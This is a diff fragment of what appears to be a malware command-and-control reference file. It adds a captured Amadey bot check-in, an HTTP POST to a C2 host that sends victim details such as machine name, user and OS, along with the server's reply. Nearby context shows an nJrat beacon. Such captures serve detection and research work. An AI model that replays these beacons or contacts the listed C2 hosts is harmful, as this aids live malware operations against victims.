@@ -36,6 +36,27 @@ el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")
 
+#### Amadey
+~~~
+POST /madapam/index.php HTTP/1.1
+Host: bolsaooma.com
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+
+id=6289217249&sd=MMMMMM&vs=1.43&ar=0&bi=0&lv=0&os=9&av=0&pc=USER-PC&un=admin&
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Wed, 09 Oct 2019 06:20:09 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 6
+Connection: close
+
+<c><d>
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/amadey.png "Amadey")
+
 #### Bladabindi - nJrat
 ~~~
 147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
